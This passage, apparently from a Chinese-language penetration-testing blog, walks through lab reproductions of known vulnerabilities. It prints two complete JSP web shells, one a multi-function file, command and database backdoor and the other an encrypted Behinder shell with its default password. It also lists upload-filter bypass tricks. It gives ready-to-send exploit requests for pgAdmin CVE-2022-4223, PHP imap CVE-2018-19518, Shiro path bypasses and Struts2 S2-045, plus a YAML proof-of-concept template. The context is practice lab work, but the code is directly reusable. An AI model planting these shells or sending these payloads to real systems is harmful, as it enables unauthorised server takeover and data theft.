&quot;&lt;-&quot;).getBytes(), 0, 3);</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void GG(String s, String d) throws Exception &#123;</span><br><span class="line">        String h = &quot;0123456789ABCDEF&quot;;</span><br><span class="line">        int n;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = new FileOutputStream(f);</span><br><span class="line">        for (int i = 0; i &lt; d.length(); i += 2) &#123;</span><br><span class="line">            os</span><br><span class="line">                    .write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d</span><br><span class="line">                            .charAt(i + 1))));</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void HH(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        if (sf.isDirectory()) &#123;</span><br><span class="line">            if (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line">            File z[] = sf.listFiles();</span><br><span class="line">            for (int j = 0; j &lt; z.length; j++) &#123;</span><br><span class="line">                HH(s + &quot;/&quot; + z[j].getName(), d + &quot;/&quot; + z[j].getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            FileInputStream is = new FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = new FileOutputStream(df);</span><br><span class="line">            int n;</span><br><span class="line">            byte[] b = new byte[512];</span><br><span class="line">            while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">                os.write(b, 0, n);</span><br><span class="line">            &#125;</span><br><span class="line">            is.close();</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void II(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        sf.renameTo(df);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void JJ(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.mkdir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void KK(String s, String t) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void LL(String s, String d) throws Exception &#123;</span><br><span class="line">        URL u = new URL(s);</span><br><span class="line">        int n;</span><br><span class="line">        FileOutputStream os = new FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream is = h.getInputStream();</span><br><span class="line">        byte[] b = new byte[512];</span><br><span class="line">        while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">            os.write(b, 0, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">        h.disconnect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void MM(InputStream is, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(is));</span><br><span class="line">        while ((l = br.readLine()) != null) &#123;</span><br><span class="line">            sb.append(l + &quot;\r\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void NN(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = c.getMetaData().getCatalogs();</span><br><span class="line">        while (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(1) + &quot;\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void OO(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] t = &#123; &quot;TABLE&quot; &#125;;</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(null, null, &quot;%&quot;, t);</span><br><span class="line">        while (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(&quot;TABLE_NAME&quot;) + &quot;\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void PP(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(&quot;\r\n&quot;);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(1005, 1007);</span><br><span class="line">        ResultSet r = m.executeQuery(&quot;select * from &quot; + x[3]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();</span><br><span class="line">        for (int i = 1; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)</span><br><span class="line">                    + &quot;)\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void QQ(String cs, String s, String q, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        int i;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(1005, 1008);</span><br><span class="line">        try &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            int n = d.getColumnCount();</span><br><span class="line">            for (i = 1; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + &quot;\t|\t&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(&quot;\r\n&quot;);</span><br><span class="line">            while (r.next()) &#123;</span><br><span class="line">                for (i = 1; i &lt;= n; i++) &#123;</span><br><span class="line">                    sb.append(EC(r.getString(i), cs) + &quot;\t|\t&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                sb.append(&quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            r.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            sb.append(&quot;Result\t|\t\r\n&quot;);</span><br><span class="line">            try &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);</span><br><span class="line">            &#125; catch (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + &quot;\t|\t\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;%&gt;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">&lt;%</span><br><span class="line">    String cs = request.getParameter(&quot;z0&quot;)==null?&quot;gbk&quot;: request.getParameter(&quot;z0&quot;) + &quot;&quot;;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(&quot;text/html;charset=&quot; + cs);</span><br><span class="line">    String Z = EC(request.getParameter(Pwd) + &quot;&quot;, cs);</span><br><span class="line">    String z1 = EC(request.getParameter(&quot;z1&quot;) + &quot;&quot;, cs);</span><br><span class="line">    String z2 = EC(request.getParameter(&quot;z2&quot;) + &quot;&quot;, cs);</span><br><span class="line">    StringBuffer sb = new StringBuffer(&quot;&quot;);</span><br><span class="line">    try &#123;</span><br><span class="line">        sb.append(&quot;-&gt;&quot; + &quot;|&quot;);</span><br><span class="line">        if (Z.equals(&quot;A&quot;)) &#123;</span><br><span class="line">            String s = new File(application.getRealPath(request</span><br><span class="line">                    .getRequestURI())).getParent();</span><br><span class="line">            sb.append(s + &quot;\t&quot;);</span><br><span class="line">            if (!s.substring(0, 1).equals(&quot;/&quot;)) &#123;</span><br><span class="line">                AA(sb);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (Z.equals(&quot;B&quot;)) &#123;</span><br><span class="line">            BB(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;C&quot;)) &#123;</span><br><span class="line">            String l = &quot;&quot;;</span><br><span class="line">            BufferedReader br = new BufferedReader(</span><br><span class="line">                    new InputStreamReader(new FileInputStream(new File(</span><br><span class="line">                            z1))));</span><br><span class="line">            while ((l = br.readLine()) != null) &#123;</span><br><span class="line">                sb.append(l + &quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125; else if (Z.equals(&quot;D&quot;)) &#123;</span><br><span class="line">            BufferedWriter bw = new BufferedWriter(</span><br><span class="line">                    new OutputStreamWriter(new FileOutputStream(</span><br><span class="line">                            new File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;E&quot;)) &#123;</span><br><span class="line">            EE(z1);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;F&quot;)) &#123;</span><br><span class="line">            FF(z1, response);</span><br><span class="line">        &#125; else if (Z.equals(&quot;G&quot;)) &#123;</span><br><span class="line">            GG(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;H&quot;)) &#123;</span><br><span class="line">            HH(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;I&quot;)) &#123;</span><br><span class="line">            II(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;J&quot;)) &#123;</span><br><span class="line">            JJ(z1);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;K&quot;)) &#123;</span><br><span class="line">            KK(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;L&quot;)) &#123;</span><br><span class="line">            LL(z1, z2);</span><br><span class="line">            sb.append(&quot;1&quot;);</span><br><span class="line">        &#125; else if (Z.equals(&quot;M&quot;)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(2), z1.substring(0, 2), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(c);</span><br><span class="line">            MM(p.getInputStream(), sb);</span><br><span class="line">            MM(p.getErrorStream(), sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;N&quot;)) &#123;</span><br><span class="line">            NN(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;O&quot;)) &#123;</span><br><span class="line">            OO(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;P&quot;)) &#123;</span><br><span class="line">            PP(z1, sb);</span><br><span class="line">        &#125; else if (Z.equals(&quot;Q&quot;)) &#123;</span><br><span class="line">            QQ(cs, z1, z2, sb);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(&quot;|&quot; + &quot;&lt;-&quot;);</span><br><span class="line">    out.print(sb.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141104305.png" alt="image-20240614110457259"></p>

        <h6 id="关键点：绕过文件上传限制"   >
          <a href="#关键点：绕过文件上传限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键点：绕过文件上传限制" class="headerlink" title="关键点：绕过文件上传限制"></a>关键点：绕过文件上传限制</h6>
      
        <h6 id="后缀名后加-可绕过上传，文件名后缀加-DATA，上传文件后缀名加上-20，上传文件名后缀加上"   >
          <a href="#后缀名后加-可绕过上传，文件名后缀加-DATA，上传文件后缀名加上-20，上传文件名后缀加上" class="heading-link"><i class="fas fa-link"></i></a><a href="#后缀名后加-可绕过上传，文件名后缀加-DATA，上传文件后缀名加上-20，上传文件名后缀加上" class="headerlink" title="后缀名后加/可绕过上传，文件名后缀加::$DATA，上传文件后缀名加上%20，上传文件名后缀加上."></a>后缀名后加/可绕过上传，文件名后缀加::$DATA，上传文件后缀名加上%20，上传文件名后缀加上.</h6>
      <p>再用蚁剑连接，密码为<code>pass</code>，并且这里类型要选择<code>CUSTOM</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141106878.png" alt="image-20240614110623828"></p>
<p>添加数据拿到shell</p>
<p>但是不知道为啥同样的文件内容冰蝎就是连接失败，若是要用冰蝎则上传的文件内容应为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>连接密码为rebeyond</p>
<p>附：</p>
<p>详细通关教程：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/byt8563/article/details/107016312/" >https://blog.csdn.net/byt8563/article/details/107016312/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>kali下载蚁剑教程</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Bing_Geng/article/details/134451677" >https://blog.csdn.net/Bing_Geng/article/details/134451677</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="Pgadmin"   >
          <a href="#Pgadmin" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pgadmin" class="headerlink" title="Pgadmin"></a>Pgadmin</h1>
      
        <h2 id="pgAdmin-lt-6-16无授权远程命令执行漏洞CVE-2022-4223"   >
          <a href="#pgAdmin-lt-6-16无授权远程命令执行漏洞CVE-2022-4223" class="heading-link"><i class="fas fa-link"></i></a><a href="#pgAdmin-lt-6-16无授权远程命令执行漏洞CVE-2022-4223" class="headerlink" title="pgAdmin&lt;=6.16无授权远程命令执行漏洞CVE-2022-4223"></a>pgAdmin&lt;=6.16无授权远程命令执行漏洞CVE-2022-4223</h2>
      <p>pgAdmin是一个著名的PostgreSQL数据库管理平台。</p>
<p>pgAdmin包含一个HTTP API可以用来让用户选择并验证额外的PostgreSQL套件，比如pg_dump和pg_restore。但在其6.16版本及以前，对于用户传入的路径没有做合适的验证，导致未授权的用户可以在目标服务器上执行任意命令。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281409231.png" alt="image-20240628140918094"></p>
<p>首先抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281410618.png" alt="image-20240628141044571"></p>
<p>直接将数据包修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: your-ip:5050</span><br><span class="line">Content-Length: 27</span><br><span class="line">X-pgA-CSRFToken: [csrf-token]</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7</span><br><span class="line">Cookie: pga4_session=[session-id]</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></div></figure>

<p>提示说csrf token丢失，所以需要先获取一个新的session id和csrf token</p>
<p>重新抓包，发送数据包</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /login HTTP/1.1</span><br><span class="line">Host: your-ip:5050</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></div></figure>

<p>在返回包中拿到一个新的session id和csrf token</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281425890.png" alt="image-20240628142532831"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281426935.png" alt="image-20240628142608879"></p>
<p>将获取到的session id和csrf token填写进数据包并发送（这里做的时候出了点意外，又重新获取了一次seession id和csrf token，所以数据包里的内容和截图有区别）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.162.131:5050</span><br><span class="line">X-pgA-CSRFToken: ImRjNjlkOWUzZmI0OTJjMTJmYTFmMjgxNWQ3NTBlNzRiYjBjMGFjNDIi.Zn5X8w.jdDVrCOV27AhWtX-UGB3jHYijHg</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7</span><br><span class="line">Cookie: pga4_session=0922425a-06b5-4097-894b-c447f1b58faf!Nu8KGbjMfuUw8a6M5A1M3WLKHdhmMaVRfCpcTPj8JrQ=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>id</code>命令执行成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281430135.png" alt="image-20240628143007075"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">requests:</span><br><span class="line">  - method: GET</span><br><span class="line">    path:</span><br><span class="line">      - &quot;&#123;&#123;BaseURL&#125;&#125;/login&quot;</span><br><span class="line"></span><br><span class="line">    extractors:</span><br><span class="line">      - type: regex</span><br><span class="line">        name: session_id</span><br><span class="line">        group: 1</span><br><span class="line">        regex:</span><br><span class="line">          - &#x27;Set-Cookie: pga4_session=([^;]+);&#x27;</span><br><span class="line"></span><br><span class="line">      - type: regex</span><br><span class="line">        name: csrf_token</span><br><span class="line">        group: 1</span><br><span class="line">        regex:</span><br><span class="line">          - &#x27;name=&quot;csrf_token&quot; type=&quot;hidden&quot; value=&quot;([^&quot;]+)&quot;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  - method: POST</span><br><span class="line">    path:</span><br><span class="line">      - &quot;&#123;&#123;BaseURL&#125;&#125;/misc/validate_binary_path&quot;</span><br><span class="line">    headers:</span><br><span class="line">      X-pgA-CSRFToken: &quot;&#123;&#123;csrf_token&#125;&#125;&quot;</span><br><span class="line">      Cookie: &quot;pga4_session=&#123;&#123;session_id&#125;&#125;&quot;</span><br><span class="line">      Content-Type: &quot;application/json&quot;</span><br><span class="line">    </span><br><span class="line">    body: |</span><br><span class="line">      &#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    matchers-condition: and</span><br><span class="line">    matchers:</span><br><span class="line">      - type: word</span><br><span class="line">        part: body</span><br><span class="line">        words:</span><br><span class="line">          - &quot;uid&quot;</span><br><span class="line">          - &quot;gid&quot;</span><br><span class="line">          - &quot;groups&quot;</span><br><span class="line">        condition: and</span><br><span class="line"></span><br><span class="line">      - type: status</span><br><span class="line">        status:</span><br><span class="line">          - 200</span><br></pre></td></tr></table></div></figure>

<p><span class="exturl"><a class="exturl__link"   href="E:\AH\poc\" >yaml式POC</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="PHP"   >
          <a href="#PHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1>
      
        <h2 id="imap-远程命令执行漏洞CVE-2018-19518"   >
          <a href="#imap-远程命令执行漏洞CVE-2018-19518" class="heading-link"><i class="fas fa-link"></i></a><a href="#imap-远程命令执行漏洞CVE-2018-19518" class="headerlink" title="imap 远程命令执行漏洞CVE-2018-19518"></a>imap 远程命令执行漏洞CVE-2018-19518</h2>
      <p>php imap扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。</p>
<p>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281013276.png" alt="image-20240628101347140"></p>
<p>随便输入后点击“Submit”并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281034320.png"></p>
<p>将<code>hostname</code>字段的值修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh&#125;</span><br></pre></td></tr></table></div></figure>


        <h6 id="解释"   >
          <a href="#解释" class="heading-link"><i class="fas fa-link"></i></a><a href="#解释" class="headerlink" title="解释"></a>解释</h6>
      <p>使用url解码后为<code>x -oProxyCommand=echo    ZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64    -d|sh&#125;</code></p>
<p>其中<code>ZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=</code>再用base64解码：<code>echo &#39;1234567890&#39;&gt;/tmp/test0001</code></p>
<p>通过<code>-oProxyCommand</code>参数执行命令，<code>x</code>可以是任意值</p>
<p>发包之后查看容器文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps  //查看容器id</span><br><span class="line">sudo docker exec -i 容器id /bin/bash</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281023041.png" alt="image-20240628102347984"></p>
<p>成功创建test0001文件并写入1234567890</p>

        <h5 id="反弹shell-1"   >
          <a href="#反弹shell-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h5>
      
        <h1 id="Shiro"   >
          <a href="#Shiro" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h1>
      
        <h2 id="CVE-2010-3863"   >
          <a href="#CVE-2010-3863" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/../admin/</span><br></pre></td></tr></table></div></figure>




        <h2 id="CVE-2020-1957"   >
          <a href="#CVE-2020-1957" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/x/..;/admin/</span><br></pre></td></tr></table></div></figure>

<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://drinkflower.asia/wordpress/archives/458" >https://drinkflower.asia/wordpress/archives/458</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="struts2"   >
          <a href="#struts2" class="heading-link"><i class="fas fa-link"></i></a><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1>
      
        <h2 id="s2-045"   >
          <a href="#s2-045" class="heading-link"><i class="fas fa-link"></i></a><a href="#s2-045" class="headerlink" title="s2-045"></a>s2-045</h2>
      <p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行。恶意用户可在上传文件时通过修改HTTP请求头中的<code>Content-Type</code>值来触发该漏洞，进而执行系统命令（Struts2框架执行了恶意用户传进来的OGNL表达式）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141441706.png" alt="image-20240614144133560"></p>

        <h5 id="验证"   >
          <a href="#验证" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证" class="headerlink" title="验证"></a>验证</h5>
      <p>随便上传一个文件提交并抓包，发送到Repeater后，添加<code>Content-Type</code>，注意位置不要在最后面）</p>
<p>构造payload：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br></pre></td></tr></table></div></figure>

<p><code>%&#123;&#125;</code>：这是Struts2框架中用于解析OGNL表达式的标识符</p>
<p><code>#context</code>：这是OGNL上下文对象，包含了请求和响应相关的信息</p>
<p><code>[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;]</code>：通过OGNL访问HTTP响应对象</p>
<p><code>.addHeader(&#39;vulhub&#39;,233*233)</code>：调用<code>addHeader</code>方法向HTTP响应头中添加一个名为<code>vulhub</code>的头，值为<code>233*233</code>的计算结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141442447.png" alt="image-20240614144258401"></p>
<p>发包之后看到成功执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141444227.png" alt="image-20240614144400193"></p>

        <h5 id="使用工具连接反弹shell"   >
          <a href="#使用工具连接反弹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用工具连接反弹shell" class="headerlink" title="使用工具连接反弹shell"></a>使用工具连接反弹shell</h5>
      <p>#msf</p>
<p>启动msf，搜索该漏洞</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2017-5638</span><br></pre></td></tr></table></div></figure>

